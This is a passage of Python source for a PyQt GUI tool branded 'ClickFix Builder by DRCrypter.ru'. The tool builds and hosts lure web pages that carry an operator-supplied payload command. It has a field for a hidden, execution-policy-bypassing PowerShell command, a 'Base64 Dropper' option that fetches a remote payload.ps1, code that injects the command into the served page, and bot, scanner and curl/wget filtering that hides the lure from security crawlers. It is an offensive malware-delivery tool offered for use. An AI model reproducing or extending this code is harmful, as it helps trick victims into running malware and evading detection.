                       .replace('<link rel="stylesheet" href="styles.css">', '<style>' + CSS + '</style>'));
    document.close();
}}

if (typeof window !== 'undefined') {{
    renderStub();
}}
"""
    return stub


def generate_inlined_html(config, js_content, css_content, html_content, blocked_ips=None, client_ip=""):
    cmd = config.get("command", "").replace('"', '\\"')
    url = config.get("custom_url_execute", "").replace('"', '\\"')
    js_embedded = js_content.replace("{{COMMAND}}", cmd).replace("{{CUSTOM_URL}}", url)
    
    # Add IP check at start of JS
    if blocked_ips:
        ip_check = f"""
        if (["{ '","'.join(blocked_ips) }"].includes("{client_ip}")) {{
            document.body.innerHTML = '<div style="text-align:center;padding:50px;font-family:Arial;"><h1>🚫 Access Denied</h1><p>Your IP ({client_ip}) has been blocked.</p></div>';
            throw new Error("IP Blocked");
        }}
        """
        js_embedded = ip_check + js_embedded
    
    html_out = html_content.replace('</body>', f'<script>{js_embedded}</script></body>')
    html_out = html_out.replace('<link rel="stylesheet" href="styles.css">', f'<style>{css_content}</style>')
    html_out = html_out.replace('<script src="main.js"></script>', '')
    return html_out


# VPS HTTP HANDLER 
class VPSHandler(http.server.SimpleHTTPRequestHandler):
    config = {}
    log_callback = None
    js_content = ""
    css_content = ""
    html_content = ""
    report_gen = None
    ip_blocker = None
    realtime_block = False
    
    def log_message(self, format, *args):
        if self.log_callback:
            self.log_callback(f"{self.address_string()} - {format % args}")
    
    def get_client_ip(self):
        forwarded = self.headers.get('X-Forwarded-For')
        if forwarded:
            return forwarded.split(',')[0].strip()
        return self.client_address[0]
    
    def check_bot(self, user_agent):
        bots = ['bot', 'crawl', 'spider', 'scrape', 'scan', 'python', 'curl', 'wget', 'httpclient']
        return any(bot in user_agent.lower() for bot in bots)
    
    def do_GET(self):
        client_ip = self.get_client_ip()
        user_agent = self.headers.get('User-Agent', 'Unknown')
        path = self.path.split('?')[0]
        
        # Real-time blocking check
        if self.realtime_block and self.ip_blocker and self.ip_blocker.is_blocked(client_ip):
            self.send_block_page("IP Blocked by Administrator", client_ip)
            if self.report_gen:
                self.report_gen.log_attempt(client_ip, user_agent, path, False, "Manual Block")
            return
        
        # Bot detection
        is_bot = self.check_bot(user_agent)
        if is_bot and self.realtime_block:
            # Optionally auto-block bot IPs
            if self.ip_blocker and not self.ip_blocker.is_blocked(client_ip):
                # Add to blocklist for future
                self.ip_blocker.load_rules([client_ip])
            self.send_block_page("Bot Detected", client_ip)
            if self.report_gen:
                self.report_gen.log_attempt(client_ip, user_agent, path, False, "Auto Bot Block")
            return
        
        # Access control
        if self.ip_blocker and self.ip_blocker.is_blocked(client_ip):
            self.send_block_page("Access Denied (Rule Match)", client_ip)
            if self.report_gen:
                self.report_gen.log_attempt(client_ip, user_agent, path, False, "Rule Block")
            return
        
        # Log successful access
        if self.report_gen:
            self.report_gen.log_attempt(client_ip, user_agent, path, True, "Allowed")
        
        # Serve content
        if path in ['/', '/index.html']:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            blocked_list = []  # we don't send full list to client
            html = generate_inlined_html(self.config, self.js_content, self.css_content, 
                                        self.html_content, blocked_list, client_ip)
            self.wfile.write(html.encode())
            
        elif path == '/stub.js':
            self.send_response(200)
            self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            blocked_list = []
            stub = generate_stub_file(self.config, self.js_content, self.css_content, 
                                     self.html_content, blocked_list)
            self.wfile.write(stub.encode())
        else:
            self.send_response(404)
            self.end_headers()
    
    def send_block_page(self, message, client_ip):
        self.send_response(403)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Access Denied</title>
    <style>
        body {{ 
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            font-family: system-ui, -apple-system, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }}
        .container {{
            background: rgba(30, 41, 59, 0.9);
            padding: 40px;
            border-radius: 16px;
            border: 1px solid rgba(239, 68, 68, 0.3);
            text-align: center;
            max-width: 400px;
        }}
        .icon {{ font-size: 48px; margin-bottom: 20px; }}
        h1 {{ color: #ef4444; margin-bottom: 10px; }}
        .ip {{ 
            background: rgba(15, 23, 42, 0.8);
            padding: 8px 16px;
            border-radius: 8px;
            font-family: monospace;
            color: #60a5fa;
            margin-top: 15px;
            display: inline-block;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🚫</div>
        <h1>Access Denied</h1>
        <p>{message}</p>
        <div class="ip">{client_ip}</div>
        <p style="margin-top: 20px; color: #64748b; font-size: 14px;">Security System Active</p>
    </div>
</body>
</html>"""
        self.wfile.write(html.encode())


# SERVER THREAD 
class ServerThread(QThread):
    log_signal = pyqtSignal(str)
    status_signal = pyqtSignal(str)
    
    def __init__(self, config, js_content, css_content, html_content, mode="portable"):
        super().__init__()
        self.config = config
        self.js_content = js_content
        self.css_content = css_content
        self.html_content = html_content
        self.mode = mode
        self.server = None
        self.running = False
        self.report_gen = None
        self.ip_blocker = None
        self.realtime_block = False
        
    def set_vps_mode(self, report_dir, realtime_block=False, blocker_config=None):
        self.report_gen = ReportGenerator(report_dir)
        self.realtime_block = realtime_block
        if blocker_config:
            self.ip_blocker = IPBlocker(blocker_config)
        else:
            self.ip_blocker = IPBlocker({"enabled": realtime_block})
        
    def block_ip(self, ip):
        if self.ip_blocker:
            self.ip_blocker.load_rules([ip])
            if self.report_gen:
                self.report_gen.log_attempt(ip, "Manual Block", "/admin", False, "Admin Blocked")
        
    def run(self):
        handler = VPSHandler if self.mode == "vps" else http.server.SimpleHTTPRequestHandler
        
        if self.mode == "vps":
            VPSHandler.config = self.config
            VPSHandler.js_content = self.js_content
            VPSHandler.css_content = self.css_content
            VPSHandler.html_content = self.html_content
            VPSHandler.report_gen = self.report_gen
            VPSHandler.ip_blocker = self.ip_blocker
            VPSHandler.realtime_block = self.realtime_block
            VPSHandler.log_callback = self.log_message
        
        port = self.config.get("server", {}).get("port", 8080)
        host = self.config.get("server", {}).get("host", "0.0.0.0")
        
        try:
            self.server = socketserver.TCPServer((host, port), handler)
            self.running = True
            self.status_signal.emit("running")
            self.log_message(f"Server started on http://{host}:{port} [{self.mode.upper()} MODE]")
            self.server.serve_forever()
        except Exception as e:
            self.log_message(f"Server error: {str(e)}")
            self.status_signal.emit("error")
            
    def log_message(self, msg):
        self.log_signal.emit(msg)
        
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
        self.running = False
        self.status_signal.emit("stopped")
        self.wait()


# SIDEBAR BUTTON
class SidebarButton(QPushButton):
    def __init__(self, text, icon, parent=None):
        super().__init__(parent)
        self.setText(f"{icon}  {text}")
        self.setMinimumHeight(50)
        self.setCursor(Qt.CursorShape.PointingHandCursor)
        self.setCheckable(True)
        self.setStyleSheet("""
            QPushButton {
                background-color: transparent;
                color: #94a3b8;
                border: none;
                border-radius: 10px;
                padding: 14px 24px;
                text-align: left;
                margin: 4px 12px;
                font-weight: 500;
                font-size: 12pt;
            }
            QPushButton:hover {
                background-color: rgba(59, 130, 246, 0.1);
                color: #60a5fa;
            }
            QPushButton:checked {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #3b82f6, stop:1 #2563eb);
                color: white;
                font-weight: 600;
            }
        """)


# MAIN WINDOW
class BuilderWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ClickFix Builder v1.1.0 by DRCrypter.ru")
        self.setMinimumSize(1500, 950)
        self.resize(1600, 1000)
        
        self.config = DEFAULT_CONFIG.copy()
        self.server_thread = None
        self.ip_history = []
        self.current_mode = "portable"  # or "vps"
        self.saved_command = ""  # Store original command when enabling advanced mode
        self.advanced_active = False
        
        self.setup_ui()
        self.load_config_to_ui()
        
    def setup_ui(self):
        central = QWidget()
        self.setCentralWidget(central)
        main_layout = QHBoxLayout(central)
        main_layout.setSpacing(0)
        main_layout.setContentsMargins(0, 0, 0, 0)
        
        # Sidebar - fixed width
        sidebar = QWidget()
        sidebar.setFixedWidth(300)
        sidebar.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                border-right: 1px solid #1e293b;
            }
        """)
        sidebar_layout = QVBoxLayout(sidebar)
        sidebar_layout.setSpacing(8)
        sidebar_layout.setContentsMargins(0, 24, 0, 24)
        
        # Logo
        logo_widget = QWidget()
        logo_layout = QHBoxLayout(logo_widget)
        logo_layout.setContentsMargins(24, 0, 24, 24)
        logo_icon = QLabel("🔒")
        logo_icon.setStyleSheet("font-size: 32px;")
        logo_layout.addWidget(logo_icon)
        logo_text = QLabel("ClickFix Builder")
        logo_text.setStyleSheet("color: #f8fafc; font-weight: 700; font-size: 22px;")
        logo_layout.addWidget(logo_text)
        logo_layout.addStretch()
        sidebar_layout.addWidget(logo_widget)
        
        # Separator
        sep = QFrame()
        sep.setFrameShape(QFrame.Shape.HLine)
        sep.setStyleSheet("background-color: #1e293b; max-height: 1px;")
        sidebar_layout.addWidget(sep)
        sidebar_layout.addSpacing(16)
        
        # Navigation
        self.nav_buttons = []
        
        self.btn_build = SidebarButton("Config", "🚀")
        self.btn_build.clicked.connect(lambda: self.switch_page(0))
        self.nav_buttons.append(self.btn_build)
        sidebar_layout.addWidget(self.btn_build)
        
        self.btn_vps = SidebarButton("VPS Control", "🌐")
        self.btn_vps.clicked.connect(lambda: self.switch_page(1))
        self.nav_buttons.append(self.btn_vps)
        sidebar_layout.addWidget(self.btn_vps)
        
        self.btn_monitor = SidebarButton("Monitoring", "📊")
        self.btn_monitor.clicked.connect(lambda: self.switch_page(2))
        self.nav_buttons.append(self.btn_monitor)
        sidebar_layout.addWidget(self.btn_monitor)
        
        sidebar_layout.addStretch()
        
        # Mode Indicator
        mode_card = QWidget()
        mode_card.setStyleSheet("""
            QWidget {
                background-color: #1e293b;
                border-radius: 12px;
                margin: 12px;
                border: 1px solid #334155;
            }
        """)
        mode_layout = QVBoxLayout(mode_card)
        mode_layout.setSpacing(12)
        mode_layout.setContentsMargins(16, 16, 16, 16)
        
        mode_title = QLabel("DEPLOYMENT MODE")
        mode_title.setStyleSheet("color: #64748b; font-weight: 700; font-size: 11px; letter-spacing: 1px;")
        mode_layout.addWidget(mode_title)
        
        self.mode_indicator = QLabel("● Portable File")
        self.mode_indicator.setStyleSheet("color: #3b82f6; font-weight: 600; font-size: 12pt;")
        mode_layout.addWidget(self.mode_indicator)
        
        self.server_status = QLabel("⭕ Server Offline")
        self.server_status.setStyleSheet("color: #64748b; font-size: 10pt;")
        mode_layout.addWidget(self.server_status)
        
        sidebar_layout.addWidget(mode_card)
        main_layout.addWidget(sidebar)
        
        # Right side - content and log splitter
        right_widget = QWidget()
        right_layout = QVBoxLayout(right_widget)
        right_layout.setSpacing(24)
        right_layout.setContentsMargins(32, 32, 32, 32)
        
        # Stack for pages - expands to take available space
        self.stack = QStackedWidget()
        self.stack.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
        right_layout.addWidget(self.stack)
        
     
        splitter = QSplitter(Qt.Orientation.Vertical)
        splitter.addWidget(self.stack)
        
        log_panel = QWidget()
        log_panel.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                border: 1px solid #1e293b;
                border-radius: 12px;
            }
        """)
        log_layout = QVBoxLayout(log_panel)
        log_layout.setSpacing(8)
        log_layout.setContentsMargins(16, 16, 16, 16)
        
        log_header = QLabel("📋 SYSTEM LOG")
        log_header.setStyleSheet("color: #64748b; font-weight: 700; font-size: 11px; letter-spacing: 1px;")
        log_layout.addWidget(log_header)
        
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setFont(QFont("Consolas", 10))
        self.log_output.setStyleSheet("""
            QTextEdit {
                background-color: transparent;
                color: #34d399;
                border: none;
                padding: 8px;
            }
        """)
        log_layout.addWidget(self.log_output)
        
        splitter.addWidget(log_panel)
        splitter.setSizes([600, 200])  # sizes: content 600px, log 200px
        
        right_layout.addWidget(splitter)
        main_layout.addWidget(right_widget, stretch=1)  # right side takes all remaining space
        
        self.setup_pages()
        self.switch_page(0)
        
    def setup_pages(self):
        self.setup_build_page()
        self.setup_vps_page()
        self.setup_monitor_page()
        
    def switch_page(self, index):
        self.stack.setCurrentIndex(index)
        for i, btn in enumerate(self.nav_buttons):
            btn.setChecked(i == index)
            
    def setup_build_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setSpacing(24)
        layout.setContentsMargins(0, 0, 0, 0)
        
        # Header
        header = QLabel("Build Center")
        header.setStyleSheet("color: #f8fafc; font-size: 28pt; font-weight: 700;")
        layout.addWidget(header)
        
        # Mode Selection
        mode_widget = QWidget()
        mode_widget.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                border-radius: 16px;
                border: 1px solid #1e293b;
            }
        """)
        mode_layout = QHBoxLayout(mode_widget)
        mode_layout.setSpacing(16)
        mode_layout.setContentsMargins(20, 20, 20, 20)
        
        mode_label = QLabel("Select Build Mode:")
        mode_label.setStyleSheet("color: #94a3b8; font-weight: 600; font-size: 11pt;")
        mode_layout.addWidget(mode_label)
        
        self.mode_portable = QRadioButton("📦 Portable File")
        self.mode_portable.setChecked(True)
        self.mode_portable.setStyleSheet("color: #f8fafc; font-size: 11pt; spacing: 8px;")
        self.mode_portable.toggled.connect(lambda: self.change_mode("portable"))
        mode_layout.addWidget(self.mode_portable)
        
        self.mode_vps = QRadioButton("🌐 VPS Deploy")
        self.mode_vps.setStyleSheet("color: #f8fafc; font-size: 11pt; spacing: 8px;")
        self.mode_vps.toggled.connect(lambda: self.change_mode("vps"))
        mode_layout.addWidget(self.mode_vps)
        
        mode_layout.addStretch()
        layout.addWidget(mode_widget)
        
        # Configuration Form - Scroll area to handle many fields
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll.setStyleSheet("QScrollArea { border: none; background: transparent; }")
        
        form_widget = QWidget()
        form_layout = QVBoxLayout(form_widget)
        form_layout.setSpacing(20)
        
        # Command Field
        cmd_container = QWidget()
        cmd_layout = QVBoxLayout(cmd_container)
        cmd_layout.setSpacing(6)
        cmd_layout.setContentsMargins(0, 0, 0, 0)
        
        cmd_label = QLabel("Payload Command")
        cmd_label.setStyleSheet("color: #64748b; font-weight: 600; font-size: 11pt;")
        cmd_layout.addWidget(cmd_label)
        
        self.command_input = QLineEdit()
        self.command_input.setPlaceholderText("powershell -ExecutionPolicy Bypass -w hidden -c ...")
        self.command_input.setStyleSheet(self.input_style())
        cmd_layout.addWidget(self.command_input)
        form_layout.addWidget(cmd_container)
        
        # Advanced Base64 Dropper Checkbox
        self.advanced_cmd_check = QCheckBox("Use Advanced Base64 Dropper")
        self.advanced_cmd_check.setStyleSheet("color: #94a3b8; font-size: 10pt;")
        self.advanced_cmd_check.toggled.connect(self.toggle_advanced_command)
        form_layout.addWidget(self.advanced_cmd_check)
        
        # URL Field (for custom URL)
        url_container = QWidget()
        url_layout = QVBoxLayout(url_container)
        url_layout.setSpacing(6)
        url_layout.setContentsMargins(0, 0, 0, 0)
        
        url_label = QLabel("Custom URL (Required for Advanced Mode)")
        url_label.setStyleSheet("color: #64748b; font-weight: 600; font-size: 11pt;")
        url_layout.addWidget(url_label)
        
        self.custom_url_input = QLineEdit()
        self.custom_url_input.setPlaceholderText("http://your-server.com/payload.ps1")
        self.custom_url_input.setStyleSheet(self.input_style())
        self.custom_url_input.textChanged.connect(self.on_custom_url_changed)
        url_layout.addWidget(self.custom_url_input)
        form_layout.addWidget(url_container)
        
        # Host and Port Row
        host_row = QWidget()
        host_layout = QHBoxLayout(host_row)
        host_layout.setSpacing(20)
        host_layout.setContentsMargins(0, 0, 0, 0)
        
        # Host
        host_container = QWidget()
        host_vlayout = QVBoxLayout(host_container)
        host_vlayout.setSpacing(6)
        host_vlayout.setContentsMargins(0, 0, 0, 0)
        
        host_label = QLabel("Host Address")
        host_label.setStyleSheet("color: #64748b; font-weight: 600; font-size: 11pt;")
        host_vlayout.addWidget(host_label)
        
        self.server_host = QLineEdit("0.0.0.0")
        self.server_host.setStyleSheet(self.input_style())
        host_vlayout.addWidget(self.server_host)
        host_layout.addWidget(host_container)
        
        # Port
        port_container = QWidget()
        port_vlayout = QVBoxLayout(port_container)
        port_vlayout.setSpacing(6)
        port_vlayout.setContentsMargins(0, 0, 0, 0)
        
        port_label = QLabel("Port")
        port_label.setStyleSheet("color: #64748b; font-weight: 600; font-size: 11pt;")
        port_vlayout.addWidget(port_label)
        
        self.server_port = QSpinBox()
        self.server_port.setRange(1, 65535)
        self.server_port.setValue(8080)
        self.server_port.setStyleSheet(self.spin_style())
        port_vlayout.addWidget(self.server_port)
        host_layout.addWidget(port_container)
        
        form_layout.addWidget(host_row)
        
        # Blocking Rules (replaces old access control)
        block_group = QWidget()
        block_group_layout = QVBoxLayout(block_group)
        block_group_layout.setSpacing(10)
        block_group.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                border: 1px solid #334155;
                border-radius: 12px;
                padding: 12px;
            }
        """)
        
        block_header = QLabel("🚫 IP Blocking Rules")
        block_header.setStyleSheet("color: #ef4444; font-weight: 700; font-size: 12pt;")
        block_group_layout.addWidget(block_header)
        
        block_desc = QLabel("One rule per line. Supported formats: 192.168.1.100, 192.168.1.0/24, 10.0.0.1-10.0.0.255")
        block_desc.setStyleSheet("color: #94a3b8; font-size: 9pt;")
        block_group_layout.addWidget(block_desc)
        
        self.block_rules_input = QTextEdit()
        self.block_rules_input.setPlaceholderText("192.168.1.0/24\n10.0.0.1-10.0.0.255\n52.12.4.25")
        self.block_rules_input.setStyleSheet("""
            QTextEdit {
                background-color: #020617;
                border: 1px solid #334155;
                border-radius: 8px;
                color: #f1f5f9;
                font-family: monospace;
                font-size: 10pt;
                padding: 8px;
            }
        """)
        # Allow vertical expansion
        self.block_rules_input.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
        block_group_layout.addWidget(self.block_rules_input)
        
        file_row = QHBoxLayout()
        self.block_file_path = QLineEdit()
        self.block_file_path.setPlaceholderText("Optional: path to targets.txt")
        self.block_file_path.setStyleSheet(self.input_style())
        file_row.addWidget(self.block_file_path)
        
        browse_file_btn = QPushButton("Browse")
        browse_file_btn.setStyleSheet(self.secondary_btn_style())
        browse_file_btn.clicked.connect(self.browse_block_file)
        file_row.addWidget(browse_file_btn)
        
        block_group_layout.addLayout(file_row)
        
        self.enable_blocking = QCheckBox("Enable IP Blocking")
        self.enable_blocking.setChecked(True)
        self.enable_blocking.setStyleSheet("color: #94a3b8; font-size: 10pt;")
        block_group_layout.addWidget(self.enable_blocking)
        
        form_layout.addWidget(block_group)
        
        scroll.setWidget(form_widget)
        layout.addWidget(scroll, stretch=1)
        
        # Build Actions
        actions_widget = QWidget()
        actions_layout = QHBoxLayout(actions_widget)
        actions_layout.setSpacing(16)
        actions_layout.setContentsMargins(0, 0, 0, 0)
        
        # Save/Load
        save_btn = QPushButton("💾 Save Config")
        save_btn.setStyleSheet(self.secondary_btn_style())
        save_btn.clicked.connect(self.save_config)
        actions_layout.addWidget(save_btn)
        
        load_btn = QPushButton("📂 Load Config")
        load_btn.setStyleSheet(self.secondary_btn_style())
        load_btn.clicked.connect(self.load_config)
        actions_layout.addWidget(load_btn)
        
        actions_layout.addStretch()
        
        # BUILD BUTTON - Changes based on mode
        self.build_btn = QPushButton("📦 BUILD PORTABLE FILES")
        self.build_btn.setMinimumHeight(56)
        self.build_btn.setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #3b82f6, stop:1 #2563eb);
                color: white;
                border: none;
                border-radius: 12px;
                font-weight: 700;
                font-size: 12pt;
                padding: 0 40px;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #2563eb, stop:1 #1d4ed8);
            }
        """)
        self.build_btn.clicked.connect(self.build_payload)
        actions_layout.addWidget(self.build_btn)
        
        layout.addWidget(actions_widget)
        
        self.stack.addWidget(page)
        
    def setup_vps_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setSpacing(24)
        layout.setContentsMargins(0, 0, 0, 0)
        
        header = QLabel("VPS Control Center")
        header.setStyleSheet("color: #f8fafc; font-size: 28pt; font-weight: 700;")
        layout.addWidget(header)
        
        # Server Control Card
        control_card = QWidget()
        control_card.setStyleSheet("""
            QWidget {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #1e40af, stop:1 #312e81);
                border-radius: 16px;
            }
        """)
        control_layout = QVBoxLayout(control_card)
        control_layout.setSpacing(20)
        control_layout.setContentsMargins(32, 32, 32, 32)
        
        control_title = QLabel("🌐 VPS Server Deployment")
        control_title.setStyleSheet("color: white; font-size: 18pt; font-weight: 700;")
        control_layout.addWidget(control_title)
        
        control_desc = QLabel("Deploy on your VPS with real-time blocking, bot detection, and HTML reporting")
        control_desc.setStyleSheet("color: #bfdbfe; font-size: 10pt;")
        control_layout.addWidget(control_desc)
        
        # Options
        options_row = QHBoxLayout()
        
        self.auto_block_check = QCheckBox("Auto-block Bots")
        self.auto_block_check.setChecked(True)
        self.auto_block_check.setStyleSheet("color: white; font-size: 10pt; spacing: 8px;")
        options_row.addWidget(self.auto_block_check)
        
        self.save_reports_check = QCheckBox("Save HTML Reports")
        self.save_reports_check.setChecked(True)
        self.save_reports_check.setStyleSheet("color: white; font-size: 10pt; spacing: 8px;")
        options_row.addWidget(self.save_reports_check)
        
        options_row.addStretch()
        control_layout.addLayout(options_row)
        
        # Server Button
        self.vps_server_btn = QPushButton("▶️ START VPS SERVER")
        self.vps_server_btn.setMinimumHeight(64)
        self.vps_server_btn.setStyleSheet("""
            QPushButton {
                background-color: rgba(255,255,255,0.2);
                color: white;
                border: 2px solid rgba(255,255,255,0.3);
                border-radius: 12px;
                font-weight: 800;
                font-size: 14pt;
            }
            QPushButton:hover {
                background-color: rgba(255,255,255,0.3);
                border: 2px solid rgba(255,255,255,0.5);
            }
        """)
        self.vps_server_btn.clicked.connect(self.toggle_vps_server)
        control_layout.addWidget(self.vps_server_btn)
        
        layout.addWidget(control_card)
        
        # Quick Block Section
        block_card = QWidget()
        block_card.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                border-radius: 12px;
                border: 1px solid #1e293b;
            }
        """)
        block_layout = QVBoxLayout(block_card)
        block_layout.setSpacing(16)
        block_layout.setContentsMargins(24, 24, 24, 24)
        
        block_title = QLabel("⚡ Quick IP Block")
        block_title.setStyleSheet("color: #f8fafc; font-weight: 700; font-size: 14pt;")
        block_layout.addWidget(block_title)
        
        block_row = QHBoxLayout()
        self.block_input = QLineEdit()
        self.block_input.setPlaceholderText("Enter IP address to block immediately...")
        self.block_input.setStyleSheet(self.input_style())
        block_row.addWidget(self.block_input)
        
        block_btn = QPushButton("⛔ BLOCK NOW")
        block_btn.setStyleSheet("""
            QPushButton {
                background-color: #ef4444;
                color: white;
                border: none;
                border-radius: 8px;
                padding: 12px 24px;
                font-weight: 700;
                font-size: 10pt;
            }
            QPushButton:hover { background-color: #dc2626; }
        """)
        block_btn.clicked.connect(self.quick_block_vps)
        block_row.addWidget(block_btn)
        
        block_layout.addLayout(block_row)
        layout.addWidget(block_card)
        
        # Live Stats
        stats_widget = QWidget()
        stats_layout = QHBoxLayout(stats_widget)
        stats_layout.setSpacing(16)
        stats_layout.setContentsMargins(0, 0, 0, 0)
        
        self.vps_stat_requests = self.create_vps_stat("Total Requests", "0", "#3b82f6")
        stats_layout.addWidget(self.vps_stat_requests)
        
        self.vps_stat_blocked = self.create_vps_stat("Blocked", "0", "#ef4444")
        stats_layout.addWidget(self.vps_stat_blocked)
        
        self.vps_stat_bots = self.create_vps_stat("Bots Detected", "0", "#f59e0b")
        stats_layout.addWidget(self.vps_stat_bots)
        
        layout.addWidget(stats_widget)
        
        # Blocked IPs List
        list_card = QWidget()
        list_card.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                border-radius: 12px;
                border: 1px solid #1e293b;
            }
        """)
        list_layout = QVBoxLayout(list_card)
        list_layout.setSpacing(12)
        list_layout.setContentsMargins(16, 16, 16, 16)
        
        list_header = QLabel("🚫 Blocked IP Addresses (Rules)")
        list_header.setStyleSheet("color: #f8fafc; font-weight: 700; font-size: 12pt;")
        list_layout.addWidget(list_header)
        
        self.blocked_list = QListWidget()
        self.blocked_list.setStyleSheet("""
            QListWidget {
                background-color: #020617;
                border: 1px solid #1e293b;
                border-radius: 8px;
                color: #f87171;
                font-size: 10pt;
            }
            QListWidget::item {
                padding: 8px;
                border-bottom: 1px solid #1e293b;
            }
        """)
        self.blocked_list.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
        list_layout.addWidget(self.blocked_list)
        
        clear_btn = QPushButton("Clear Blocked List (Rules)")
        clear_btn.setStyleSheet("""
            QPushButton {
                background-color: #374151;
                color: #9ca3b8;
                border: none;
                border-radius: 6px;
                padding: 8px;
                font-size: 9pt;
            }
        """)
        clear_btn.clicked.connect(self.clear_blocked_list)
        list_layout.addWidget(clear_btn)
        
        layout.addWidget(list_card, stretch=1)
        self.stack.addWidget(page)
        
    def setup_monitor_page(self):
        page = QWidget()
        layout = QVBoxLayout(page)
        layout.setSpacing(24)
        layout.setContentsMargins(0, 0, 0, 0)
        
        header = QLabel("Monitoring & Reports")
        header.setStyleSheet("color: #f8fafc; font-size: 28pt; font-weight: 700;")
        layout.addWidget(header)
        
        # Report Viewer
        report_card = QWidget()
        report_card.setStyleSheet("""
            QWidget {
                background-color: #0f172a;
                border-radius: 12px;
                border: 1px solid #1e293b;
            }
        """)
        report_layout = QVBoxLayout(report_card)
        report_layout.setSpacing(16)
        report_layout.setContentsMargins(24, 24, 24, 24)
        
        report_header = QHBoxLayout()
        report_title = QLabel("📊 Security Report Preview")
        report_title.setStyleSheet("color: #f8fafc; font-weight: 700; font-size: 14pt;")
        report_header.addWidget(report_title)
        
        open_btn = QPushButton("Open Report Folder")
        open_btn.setStyleSheet(self.secondary_btn_style())
        open_btn.clicked.connect(self.open_report_folder)
        report_header.addWidget(open_btn)
        report_layout.addLayout(report_header)
        
        self.report_preview = QTextEdit()
        self.report_preview.setReadOnly(True)
        self.report_preview.setStyleSheet("""
            QTextEdit {
                background-color: #020617;
                color: #34d399;
                border: 1px solid #1e293b;
                border-radius: 8px;
                padding: 16px;
                font-family: Consolas, monospace;
                font-size: 10pt;
            }
        """)
        self.report_preview.setSizePolicy(QSizePolicy.Policy.Expanding, QSizePolicy.Policy.Expanding)
        self.report_preview.setPlaceholderText("Reports will appear here when VPS server generates them...")
        report_layout.addWidget(self.report_preview)
        
        refresh_btn = QPushButton("🔄 Refresh Report Preview")
        refresh_btn.setStyleSheet(self.secondary_btn_style())
        refresh_btn.clicked.connect(self.refresh_report_preview)
        report_layout.addWidget(refresh_btn)
        
        layout.addWidget(report_card, stretch=1)
        self.stack.addWidget(page)
        
    def create_vps_stat(self, label, value, color):
        card = QWidget()
        card.setStyleSheet(f"""
            QWidget {{
                background-color: #0f172a;
                border-radius: 12px;
                border: 1px solid #1e293b;
                border-left: 4px solid {color};
            }}
        """)
        layout = QVBoxLayout(card)
        layout.setContentsMargins(20, 16, 20, 16)
        
        lbl = QLabel(label)
        lbl.setStyleSheet("color: #64748b; font-size: 10pt;")
        layout.addWidget(lbl)
        
        val = QLabel(value)
        val.setStyleSheet(f"color: {color}; font-size: 22pt; font-weight: 700;")
        layout.addWidget(val)
        
        return card
        
    def input_style(self):
        return """
            QLineEdit {
                background-color: #0f172a;
                border: 1px solid #334155;
                border-radius: 8px;
                padding: 12px 16px;
                color: #f1f5f9;
                font-size: 10pt;
            }
            QLineEdit:focus {
                border: 2px solid #3b82f6;
                background-color: #1e293b;
            }
            QLineEdit:hover {
                border: 1px solid #475569;
            }
        """
        
    def spin_style(self):
        return """
            QSpinBox {
                background-color: #0f172a;
                border: 1px solid #334155;
                border-radius: 8px;
                padding: 12px;
                color: #f1f5f9;
                font-size: 10pt;
            }
            QSpinBox:focus {
                border: 2px solid #3b82f6;
            }
        """
        
    def combo_style(self):
        return """
            QComboBox {
                background-color: #0f172a;
                border: 1px solid #334155;
                border-radius: 8px;
                padding: 12px;
                color: #f1f5f9;
                font-size: 10pt;
                min-width: 150px;
            }
            QComboBox:focus {
                border: 2px solid #3b82f6;
            }
            QComboBox QAbstractItemView {
                background-color: #0f172a;
                color: #f1f5f9;
                border: 1px solid #334155;
                selection-background-color: #3b82f6;
            }
        """
        
    def secondary_btn_style(self):
        return """
            QPushButton {
                background-color: #334155;
                color: #f1f5f9;
                border: none;
                border-radius: 8px;
                padding: 10px 20px;
                font-weight: 600;
                font-size: 10pt;
            }
            QPushButton:hover {
                background-color: #475569;
            }
        """
        
    def change_mode(self, mode):
        self.current_mode = mode
        if mode == "portable":
            self.mode_indicator.setText("● Portable File")
            self.mode_indicator.setStyleSheet("color: #3b82f6; font-weight: 600; font-size: 12pt;")
            self.build_btn.setText("📦 BUILD PORTABLE FILES")
            self.build_btn.setStyleSheet("""
                QPushButton {
                    background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #3b82f6, stop:1 #2563eb);
                    color: white;
                    border: none;
                    border-radius: 12px;
                    font-weight: 700;
                    font-size: 12pt;
                    padding: 0 40px;
                    min-height: 56px;
                }
                QPushButton:hover {
                    background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #2563eb, stop:1 #1d4ed8);
                }
            """)
        else:
            self.mode_indicator.setText("● VPS Deploy")
            self.mode_indicator.setStyleSheet("color: #10b981; font-weight: 600; font-size: 12pt;")
            self.build_btn.setText("🚀 DEPLOY TO VPS")
            self.build_btn.setStyleSheet("""
                QPushButton {
